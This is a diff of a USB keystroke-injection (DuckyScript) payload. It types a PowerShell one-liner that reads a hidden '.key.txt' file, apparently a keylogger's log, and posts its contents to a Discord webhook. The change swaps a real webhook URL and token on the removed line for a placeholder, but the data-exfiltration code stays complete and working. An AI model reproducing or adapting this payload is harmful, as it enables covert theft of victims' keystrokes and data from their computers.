@@ -14,7 +14,7 @@ CTRL-SHIFT T
 DELAY 1200
 
 STRINGLN $file = "$env:USERPROFILE\Documents\.key.txt";
-STRINGLN Start-Sleep -Seconds 30; $webhookUrl='https://discord.com/api/webhooks/1295032848780099644/do8MmGiFXPsk1CspovawiLRC-qcyDKJJ-eeIA4Xwrq9cyGxXre5sVTZjJZV21vg6pizQ'; $fileContent = (Get-Content -Path $file -Raw -ErrorAction Stop).Substring(0, [Math]::Min((Get-Content -Path $file -Raw).Length, 2000)) -replace '\r|\n', ' '; if ($fileContent -ne "") { $data = @{ 'content' = $fileContent; 'username' = 'KL' } | ConvertTo-Json -Compress; Invoke-RestMethod -Uri $webhookUrl -Method Post -ContentType 'application/json' -Body $data -ErrorAction Stop } 
+STRINGLN Start-Sleep -Seconds 30; $webhookUrl='#'; $fileContent = (Get-Content -Path $file -Raw -ErrorAction Stop).Substring(0, [Math]::Min((Get-Content -Path $file -Raw).Length, 2000)) -replace '\r|\n', ' '; if ($fileContent -ne "") { $data = @{ 'content' = $fileContent; 'username' = 'KL' } | ConvertTo-Json -Compress; Invoke-RestMethod -Uri $webhookUrl -Method Post -ContentType 'application/json' -Body $data -ErrorAction Stop } 
 
 
 test123
